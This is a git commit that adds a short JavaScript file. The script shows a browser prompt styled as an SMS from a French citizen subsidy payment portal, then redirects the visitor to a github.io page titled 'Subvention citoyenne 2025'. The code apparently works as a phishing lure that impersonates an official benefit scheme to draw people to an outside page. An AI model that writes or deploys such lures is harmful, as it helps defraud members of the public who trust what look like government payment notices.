ed874a6b7cce633e81b22fa51fd26846df35bdb8
alltipsinfo <kemztope+me@gmail.com>
2025-03-21 14:10:17 +0100

    Create nz.js

---
+++ nz.js
@@ -0,0 +1,6 @@
+
+var password = 'Subvention citoyenne'
+password=prompt('SMS :Bienvenue cher citoyen sur le portail de paiement des subventions, cliquez sur OK pour démarrer votre demande de subvention  ','Subvention citoyenne');
+if (password != 'Subvention citoyenne') {
+location.href='https://alltipsinfo.github.io/Subvention.citoyenne.2025';
+}
